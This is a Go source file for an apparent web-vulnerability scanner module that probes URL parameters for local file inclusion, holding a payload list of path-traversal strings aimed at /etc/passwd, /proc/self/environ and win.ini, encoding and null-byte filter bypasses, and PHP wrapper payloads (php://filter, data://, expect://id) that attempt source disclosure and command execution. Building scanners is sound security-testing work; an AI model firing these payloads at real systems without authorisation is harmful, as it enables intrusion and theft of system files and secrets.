package scanner

import (
	"context"
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/recon-platform/internal/config"
	"github.com/recon-platform/internal/database"
	"github.com/recon-platform/internal/tools"
	"github.com/recon-platform/pkg/logger"
)

type LFIScanner struct {
	db        *database.DB
	exec      *tools.Executor
	cfg       *config.Config
	logger    *logger.Logger
	broadcast BroadcastFunc
}

func NewLFIScanner(db *database.DB, exec *tools.Executor, cfg *config.Config, log *logger.Logger, broadcast BroadcastFunc) *LFIScanner {
	return &LFIScanner{db: db, exec: exec, cfg: cfg, logger: log, broadcast: broadcast}
}

var lfiHTTPClient = &http.Client{
	Transport: sharedHTTPTransport,
	Timeout:   15 * time.Second,
	CheckRedirect: func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	},
}

// Traversal + wrapper payloads (Linux + Windows + null-byte + encoded + wrapper).
var lfiPayloads = []string{
	"../../../../../../../../etc/passwd",
	"....//....//....//....//....//....//etc/passwd",
	"..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
	"%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
	// UTF-8 "overlong" encoding of ../ — some legacy path-traversal filters that
	// only check for the literal "../" or "%2e%2e%2f" byte sequences miss this.
	"%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd",
	"../../../../../../../../etc/passwd%00",
	// Path-truncation padding — historically defeated naive `.$ext` suffix
	// appending on some old PHP/Apache combos by overflowing MAXPATHLEN.
	"../../../../../../../../etc/passwd" + strings.Repeat("/.", 2048),
	"/etc/passwd",
	"../../../../../../../../proc/self/environ",
	"....\\....\\....\\....\\windows\\win.ini",
	"..\\..\\..\\..\\..\\..\\windows\\win.ini",
	"C:\\windows\\win.ini",
	"php://filter/convert.base64-encode/resource=index.php",
	"php://filter/convert.base64-encode/resource=../../../../etc/passwd",
	// data:// wrapper — only fires with allow_url_include on AND the app
	// require()/include()s the raw param value as code; the payload is a
	// harmless echo of a unique marker (proof-only, no side effects).
	"data://text/plain;base64," + base64.StdEncoding.EncodeToString([]byte("<?php echo 'rcnLFI_"+lfiMarker+"'; ?>")),
	// expect:// wrapper — same allow_url_include gate; `id` is a read-only,
	// non-destructive command used industry-wide as the standard LFI-to-RCE
	// PoC (proves execution without altering anything on the target).
	"expect://id",
}

// lfiMarker uniquely tags the data:// PoC payload so its confirmation can
// never collide with unrelated page content.
const lfiMarker = "a1b2c3"

// Signatures that confirm file read (very low false-positive).
var (
	reEtcPasswd = regexp.MustCompile(`root:.*:0:0:`)
	reWinIni    = regexp.MustCompile(`(?i)\[(fonts|extensions|mci extensions)\]`)
	reDaemon    = regexp.MustCompile(`(?m)^(daemon|bin|sys|nobody):`)
	// /proc/self/environ entries are NUL-separated (PATH=...\x00HTTP_USER_AGENT=...),
	// not newline-separated — [\s\S]* (not [^\x00]*) must cross that NUL byte.
	reProcEnviron = regexp.MustCompile(`PATH=[\s\S]*HTTP_USER_AGENT=`)
	reExpectID    = regexp.MustCompile(`uid=\d+\([\w-]+\)\s+gid=\d+`)
)

const lfiMaxParams = 150

// Run tests file/path-like parameters with traversal + wrapper payloads and
// confirms via /etc/passwd, win.ini, or base64-PHP signatures. Targeted+bounded.
func (s *LFIScanner) Run(ctx context.Context, targetID string, logFn LogFunc) error {
	logFn("info", "lfi", "Starting LFI / path-traversal checks...")

	candidates := s.selectCandidates(ctx, targetID)
	logFn("info", "lfi", fmt.Sprintf("Selected %d file/path-prone parameters", len(candidates)))
	if len(candidates) == 0 {
		return nil
	}

	sem := make(chan struct{}, 8)
	var wg sync.WaitGroup
	var found atomic.Int64

	for _, c := range candidates {
		if ctx.Err() != nil {
			break
		}
		wg.Add(1)
		sem <- struct{}{}
		go func(rawURL, param string) {
			defer wg.Done()
			defer func() { <-sem }()

			for _, pl := range lfiPayloads {
				body := s.fetch(ctx, injectParam(rawURL, param, pl))
				if body == "" {
					continue
				}
				if kind := confirmLFI(pl, body); kind != "" {
					s.store(targetID, "lfi", "critical", rawURL, param, pl,
						fmt.Sprintf("Local file read confirmed (%s)", kind))
					found.Add(1)
					logFn("warn", "lfi", fmt.Sprintf("LFI CONFIRMED (%s): %s param=%s", kind, rawURL, param))
					s.notify(targetID, rawURL, param)
					return
				}
			}
		}(c.url, c.param)
	}
	wg.Wait()

	logFn("info", "lfi", fmt.Sprintf("LFI check done. Found %d.", found.Load()))
	return nil
}

// confirmLFI validates a response actually contains file contents.
func confirmLFI(payload, body string) string {
	if reEtcPasswd.MatchString(body) || reDaemon.MatchString(body) {
		return "/etc/passwd"
	}
	if reWinIni.MatchString(body) {
		return "windows/win.ini"
	}
	if strings.Contains(payload, "proc/self/environ") && reProcEnviron.MatchString(body) {
		return "/proc/self/environ"
	}
	// data:// wrapper — our own unique marker echoed back means the app
	// require()/include()d the raw payload as executable PHP.
	if strings.HasPrefix(payload, "data://") && strings.Contains(body, "rcnLFI_"+lfiMarker) {
		return "data:// wrapper code execution"
	}
	// expect:// wrapper — `id` command output pattern is near-impossible to
	// appear by coincidence in an unrelated page.
	if payload == "expect://id" && reExpectID.MatchString(body) {
		return "expect:// wrapper command execution"
	}
	// php://filter base64 wrapper — decode and check for PHP source markers.
	if strings.Contains(payload, "convert.base64-encode") {
		for _, tok := range regexp.MustCompile(`[A-Za-z0-9+/]{40,}={0,2}`).FindAllString(body, -1) {
			if dec, err := base64.StdEncoding.DecodeString(tok); err == nil {
				d := string(dec)
				if strings.Contains(d, "<?php") || strings.Contains(d, "root:") {
					return "php://filter base64 source disclosure"
				}
			}
		}
	}
	return ""
}

type lfiCandidate struct{ url, param string }

func (s *LFIScanner) selectCandidates(ctx context.Context, targetID string) []lfiCandidate {
	rows, err := s.db.QueryContext(ctx, `SELECT DISTINCT url, parameter, COALESCE(value,'') FROM parameters WHERE target_id = ?`, targetID)
	if err != nil {
		return nil
	}
	defer rows.Close()
	seen := make(map[string]bool)
	var out []lfiCandidate
	for rows.Next() {
		var u, param, val string
		if err := rows.Scan(&u, &param, &val); err != nil {
			continue
		}
		// Route via the unified param classifier: name tokens (file, path,
		// filepath, download…) + value heuristic (a value that looks like a path).
		if !paramProneTo(ClassLFI, param, val) {
			continue
		}
		parsed, err := url.Parse(u)
		if err != nil {
			continue
		}
		key := parsed.Host + parsed.Path + "?" + param
		if seen[key] {
			continue
		}
		seen[key] = true
		out = append(out, lfiCandidate{u, param})
		if len(out) >= lfiMaxParams {
			break
		}
	}
	return out
}

func (s *LFIScanner) fetch(ctx context.Context, u string) string {
	reqCtx, cancel := context.WithTimeout(ctx, 12*time.Second)
	defer cancel()
	req, err := http.NewRequestWithContext(reqCtx, "GET", u, nil)
	if err != nil {
		return ""
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible)")
	resp, err := lfiHTTPClient.Do(req)
	if err != nil {
		return ""
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 256*1024))
	resp.Body.Close()
	return string(body)
}

func (s *LFIScanner) store(targetID, vulnType, severity, rawURL, param, payload, evidence string) {
	_, _ = RecordDetectorObservation(context.Background(), s.db, DetectorObservation{
		TargetID: targetID, Type: vulnType, Severity: severity, URL: rawURL, Method: "GET",
		Parameter: param, Location: "query", Payload: payload, Evidence: evidence,
		Source: "lfi-native", DetectionMethod: "file-signature-replay", Confidence: 96,
		Verdict: VerifyVerified,
	})
}

func (s *LFIScanner) notify(targetID, rawURL, param string) {
	if s.broadcast != nil {
		s.broadcast("new_vuln_finding", map[string]any{
			"target_id": targetID, "type": "lfi", "url": rawURL, "parameter": param,
		})
	}
}
